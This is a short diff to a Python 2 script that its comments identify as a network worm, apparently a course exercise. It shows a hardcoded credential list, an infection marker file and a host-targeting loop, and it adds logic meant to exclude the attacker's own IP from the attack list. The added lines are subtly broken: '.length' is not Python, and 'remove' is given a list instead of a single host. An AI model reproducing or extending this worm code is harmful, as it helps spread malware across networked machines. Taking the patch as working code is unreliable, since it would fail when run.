@@ -16,6 +16,8 @@ credList = [
 ('cpsc', 'cpsc'),
 ]
 
+AttackIP=[]
+
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
@@ -277,6 +279,9 @@ print networkHosts
 # from the list of discovered systems (we
 # do not want to target ourselves!
 
+if len(sys.argv) >= 2:
+	AttackIP.append(systemIP)
+
 attackList = []
 temp = []
 
@@ -284,6 +289,9 @@ for targetHost,j in enumerate(networkHosts):
 	if networkHosts[targetHost] != systemIP:
 		attackList.append(networkHosts[targetHost])
 print "Found Hosts to attack: ", attackList
+if(AttackIP.length > 0):
+	attackList.remove(AttackIP)
+
 
 # Go through the network hosts
 for host in attackList:
